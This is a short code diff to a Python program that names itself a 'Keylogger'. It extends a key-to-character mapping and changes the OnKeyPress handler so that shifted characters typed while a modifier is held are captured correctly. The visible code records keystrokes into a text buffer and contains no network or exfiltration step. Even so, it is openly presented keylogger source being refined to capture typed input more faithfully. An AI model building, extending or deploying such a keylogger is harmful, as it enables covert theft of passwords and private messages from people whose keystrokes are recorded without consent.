@@ -61,6 +61,7 @@ chars_mapping =  {
         "[65027]": "",  # don't ask why this has only the scan code without a proper name! This is the 'AltGR'
         "apostrophe": "'",
         "egrave": "è",
+        "less": "<",
         "Left": "",
         "Right": "",
         "Up": "",
@@ -141,7 +142,12 @@ def OnKeyPress(event):
                 else:
                     text += chars_mapping["key"].get(event.Key)
         else:
-           text += event.Key
+            # If we hold a hotkey and try to press different key 
+            # that need a hotkey to be visualized we are in this situation
+            if event.Key in chars_mapping["shift"]:
+                text += f"{chars_mapping['shift'].get(event.Key, '<NM>')}"
+            else:
+                text += event.Key
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Keylogger")
